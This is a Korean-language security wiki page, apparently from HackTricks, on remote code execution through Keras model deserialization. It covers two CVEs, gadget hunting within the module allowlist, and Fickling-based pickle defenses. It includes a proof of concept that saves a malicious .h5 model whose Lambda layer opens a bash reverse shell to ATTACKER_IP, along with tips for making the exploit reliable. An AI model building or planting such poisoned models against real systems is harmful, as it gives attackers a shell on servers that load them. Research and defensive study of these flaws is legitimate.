# Keras Model Deserialization RCE 및 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 Keras 모델 deserialization pipeline을 대상으로 한 실용적인 exploit 기법을 요약하고, 기본 .keras 형식의 내부 구조와 공격 표면을 설명하며, Model File Vulnerabilities (MFVs) 및 수정 후에도 남아 있는 gadget을 찾기 위한 연구자용 도구를 소개합니다.

## .keras 모델 형식의 내부 구조

.keras 파일은 다음 항목을 하나 이상 포함하는 ZIP 아카이브입니다:<sup>[[1]](#references)</sup>
- metadata.json – 일반 정보(예: Keras 버전)
- config.json – 모델 아키텍처(주요 공격 표면)
- model.weights.h5 – HDF5 형식의 가중치

config.json은 재귀적 deserialization을 수행합니다. Keras는 모듈을 import하고 클래스와 함수를 확인한 다음, 공격자가 제어하는 딕셔너리에서 레이어와 객체를 재구성합니다.<sup>[[1]](#references)</sup>

Dense 레이어 객체의 예시 코드:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

역직렬화는 다음을 수행합니다:<sup>[[1]](#references)</sup>
- module/class_name 키를 사용해 모듈을 가져오고 심볼을 확인합니다
- 공격자가 제어하는 kwargs를 사용해 from_config(...)를 호출하거나 생성자를 호출합니다
- 중첩 객체(activations, initializers, constraints 등)를 재귀적으로 처리합니다

역사적으로 공격자가 config.json을 제작하면 다음 세 가지 원시 기능을 제어할 수 있었습니다:<sup>[[1]](#references)</sup>
- 가져올 모듈 제어
- 확인할 클래스/함수 제어
- 생성자/from_config에 전달할 kwargs 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

근본 원인:
- 레거시 Lambda 역직렬화는 공격자가 제어하는 marshaled 코드로 Python 함수를 재구성했습니다. `func_load()`는 페이로드를 base64 디코딩하고 `marshal.loads()`를 호출한 다음 `FunctionType`을 생성합니다. 결과 함수의 바이트코드는 Lambda가 호출될 때 실행되며, 영향을 받는 2.13 이전 로더는 레거시 형식에 대해 safe-mode 검사를 적용하지 않았습니다.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

네이티브 Keras v3 아카이브에서 Lambda 함수는 `__lambda__` 객체로 표현되며, 이 객체의 `code` 필드에는 base64로 인코딩된 marshaled 코드가 들어 있습니다:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigation:
- Keras는 native Keras v3 형식에서 기본적으로 `safe_mode=True`를 적용합니다. `Lambda`의 직렬화된 Python lambda는 사용자가 명시적으로 `safe_mode=False`를 지정하지 않는 한 차단됩니다. 이 보호 기능은 legacy 형식에는 같은 방식으로 적용되지 않습니다.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

참고:
- Legacy 형식(이전 HDF5 저장본)이나 오래된 코드베이스에서는 최신 검사를 적용하지 않을 수 있으므로, 피해자가 오래된 loader를 사용하는 경우 “downgrade” 유형의 공격이 여전히 가능합니다.

## CVE-2025-1550 – Keras 3.0.0–3.8.x의 임의 모듈 import

근본 원인:
- `_retrieve_class_or_fn`은 `config.json`의 공격자가 제어하는 모듈 문자열에 `importlib.import_module(module)`을 사용했습니다.
- 영향: 조작된 `.keras` 아카이브를 통해 `Model.load_model()`이 공격자가 선택한 Python 모듈과 함수를 import하도록 만들 수 있으며, `safe_mode=True`인 경우에도 import 시점 부작용과 공격자가 제어하는 인수가 적용될 수 있습니다.<sup>[[1]](#references)[[4]](#references)</sup>

익스플로잇 아이디어:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

보안 개선 사항 (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- 모듈 allowlist: 공식 생태계 모듈로 가져오기를 제한합니다: keras, keras_hub, keras_cv, keras_nlp
- 기본 safe mode: safe_mode=True는 안전하지 않은 Lambda serialized-function 로드를 차단합니다
- 기본 타입 검사: 역직렬화된 객체는 예상 타입과 일치해야 합니다

## 실전 악용: TensorFlow-Keras HDF5 (.h5) Lambda RCE

레거시 TensorFlow-Keras 배포 환경에서는 여전히 HDF5 모델 파일(`.h5`)을 허용할 수 있습니다. 공격자가 서버에서 나중에 로드하거나 추론에 사용할 모델을 업로드할 수 있다면, 취약한 로더는 공격자가 제어하는 Python 코드가 포함된 Lambda 레이어를 역직렬화할 수 있으며, 이 코드는 애플리케이션의 모델 워크플로에서 실행될 수 있습니다.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

대상이 모델을 실행할 때 reverse shell을 실행하는 악성 .h5 파일을 만드는 최소 PoC:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

참고 사항 및 신뢰성 팁:
- 트리거 지점은 형식과 워크플로에 따라 다릅니다. 참조된 글에서는 예측 중 payload가 두 번 실행되는 것을 관찰했습니다. 부작용이 반복해서 발생할 수 있다고 보고 payload를 멱등성 있게 만드세요.<sup>[[7]](#references)</sup>
- 버전 고정: 직렬화 불일치를 피하려면 대상의 TF/Keras/Python 버전에 맞추세요. 예를 들어, 대상에서 Python 3.8과 TensorFlow 2.13.1을 사용한다면 같은 환경에서 아티팩트를 빌드하세요.<sup>[[7]](#references)</sup>
- 빠른 환경 복제:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- 검증: `os.system("ping -c 1 YOUR_IP")` 같은 무해한 payload는 reverse shell로 전환하기 전에 실행 여부를 확인하는 데 도움이 됩니다(예: `tcpdump`로 ICMP 관찰).<sup>[[7]](#references)</sup>

## 수정 후 allowlist 내부의 gadget 표면

Keras 모듈 allowlist와 safe mode를 적용하더라도, 허용된 callable이 부작용을 일으킬 수 있습니다. 예를 들어, `keras.utils.get_file`은 URL을 다운로드해 설정된 캐시 위치에 저장하므로 gadget 분석 후보가 될 수 있습니다.<sup>[[1]](#references)[[19]](#references)</sup>

후보 Lambda 설정(통제된 테스트에서 호출 시그니처 확인):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

중요한 제한 사항:
- `Lambda.call()`은 모델 입력을 항상 첫 번째 위치 인수로 전달하고, 설정된 `arguments`는 키워드 인수로 전달합니다. `get_file`의 경우 해당 위치 인수가 `fname`에 들어가므로, 텐서와 경로 간의 타입 불일치로 인해 다운로드가 시작되기 전에 이 후보가 실패할 수 있습니다. 따라서 반드시 작동하는 gadget은 아닙니다.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML 모델의 ML pickle import allowlisting (Fickling)

많은 AI/ML 모델 형식(PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn 아티팩트 및 그 밖의 Python 네이티브 형식)에는 Python pickle 데이터가 포함되어 있습니다. 앞서 설명한 레거시 Keras Lambda 경로는 대신 marshal된 함수 바이트코드를 사용하므로 별개의 역직렬화 위험입니다. Pickle opcode는 역직렬화 중 공격자가 제어하는 동작을 실행할 수 있으며, 여기에는 모델 변조 또는 RCE가 포함됩니다. 단순한 스캐너는 새롭거나 목록에 없는 위험한 import를 놓칠 수 있습니다.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

실용적인 fail-closed 방어 방법은 Python의 pickle 역직렬화기를 후킹하고, unpickling 중 검토를 거친 무해한 ML 관련 import만 허용하는 것입니다. Trail of Bits의 Fickling은 이 정책을 구현하고, 공개된 Hugging Face pickle 수천 개를 바탕으로 선별한 ML import allowlist를 제공합니다.<sup>[[8]](#references)[[13]](#references)</sup>

“안전한” import의 보안 모델(연구와 실무에서 도출한 직관): pickle에서 사용하는 import된 심볼은 다음 조건을 모두 충족해야 합니다.<sup>[[8]](#references)</sup>
- 코드를 실행하거나 코드 실행을 유발하지 않아야 합니다(컴파일된/소스 코드 객체, 셸 명령 실행, hook 등 금지).
- 임의의 속성이나 항목을 가져오거나 설정하지 않아야 합니다.
- pickle VM에서 다른 Python 객체를 import하거나 참조를 가져오지 않아야 합니다.
- 간접적인 경우를 포함해 어떠한 2차 역직렬화기도 트리거하지 않아야 합니다(예: marshal, 중첩된 pickle).

프로세스 시작 시 가능한 한 일찍 Fickling 보호 기능을 활성화하여 프레임워크가 수행하는 모든 pickle 로드(torch.load, joblib.load 등)를 검사하도록 합니다.<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

운영 팁:
- 필요한 경우 hooks를 일시적으로 비활성화하거나 다시 활성화할 수 있습니다:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- 검증된 모델이 차단된 경우, 심볼을 검토한 후 환경의 allowlist를 확장하세요:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling은 더 세밀하게 제어하고 싶을 때 사용할 수 있는 일반적인 runtime guard도 제공합니다:<sup>[[9]](#references)</sup>
  - 모든 pickle.load()에 검사를 적용하는 fickling.always_check_safety()
  - 범위를 지정해 적용하는 with fickling.check_safety():
  - 일회성 검사에 사용하는 fickling.load(path) / fickling.is_likely_safe(path)

- 가능하면 pickle이 아닌 모델 형식을 사용하세요(예: SafeTensors).<sup>[[15]](#references)</sup> pickle을 받아야 한다면 최소 권한으로, 네트워크 송신이 차단된 환경에서 loader를 실행하고 allowlist를 적용하세요.

이 allowlist 우선 전략은 호환성을 높게 유지하면서 흔히 사용되는 ML pickle exploit 경로를 효과적으로 차단합니다. ToB의 벤치마크에서 Fickling은 합성 악성 파일을 100% 탐지하고, 주요 Hugging Face 저장소의 정상 파일 중 약 99%를 허용했습니다.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 허용된 모듈에서 gadget을 체계적으로 찾기

keras, keras_nlp, keras_cv, keras_hub에서 후보 callable을 열거하고 파일/네트워크/프로세스/환경 변수에 부작용을 일으키는 항목을 우선적으로 살펴봅니다.<sup>[[1]](#references)</sup>

<details>
<summary>allowlist에 등록된 Keras 모듈에서 잠재적으로 위험한 callable 열거</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) 직접 deserialization 테스트 (.keras 아카이브 불필요)

조작한 dict를 Keras deserializer에 직접 전달해 허용되는 파라미터를 파악하고 부작용을 관찰합니다.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) 교차 버전 및 형식 테스트

Keras는 서로 다른 보호 장치와 형식을 사용하는 여러 코드베이스/세대에 걸쳐 존재합니다:<sup>[[1]](#references)</sup>
- TensorFlow 내장 Keras: tensorflow/python/keras (레거시, 삭제 예정)
- tf-keras: 별도로 유지 관리됨
- 멀티 백엔드 Keras 3 (공식): 네이티브 .keras 형식 도입

코드베이스와 형식(.keras 및 레거시 HDF5) 전반에서 테스트를 반복해 회귀나 누락된 보호 장치를 찾아냅니다.

## References

- [1] [Keras 모델 역직렬화의 취약점 탐색 (huntr 블로그)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – 직렬화 검사 추가](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda 역직렬화 RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras 임의 모듈 가져오기 (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr 보고서 – 임의 가져오기 #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr 보고서 – 임의 가져오기 #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE로 root 권한 획득](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits 블로그 – Fickling의 새로운 AI/ML pickle 파일 스캐너](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML 환경 보호 (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle 스캔 벤치마크 코퍼스](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle 공격 배경](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors 프로젝트](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda 레이어의 임의 코드 삽입 허용](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda 레이어 소스 (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python 유틸리티 소스 (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
